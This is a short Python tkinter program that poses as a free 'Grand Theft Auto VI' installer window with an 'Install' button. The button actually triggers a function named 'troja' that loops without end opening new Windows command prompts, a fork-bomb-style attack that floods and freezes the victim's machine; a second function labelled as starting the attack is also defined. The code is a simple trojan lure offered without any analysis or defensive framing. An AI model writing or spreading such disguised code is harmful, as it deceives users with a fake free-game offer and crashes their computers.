import tkinter as tk
import threading
import os

def troja():
    while True:
        os.system("start cmd.exe")

def iniciar_ataque():
    threading.Thread(target=troja).start()

janela = tk.Tk()
janela.title("Grand Theft Auto VI for Free!")
janela.geometry('350x200')

label1 = tk.Label(janela, text="installation of Grand Theft Auto VI", font=("Arial Black",12))
label1.pack(pady=5)

bt1 = tk.Button(janela,
                text="Install",
                bg="Green",
                fg="White",
                font=("Arial Black", 12),
                command=troja)
bt1.pack(pady=20)

janela.mainloop()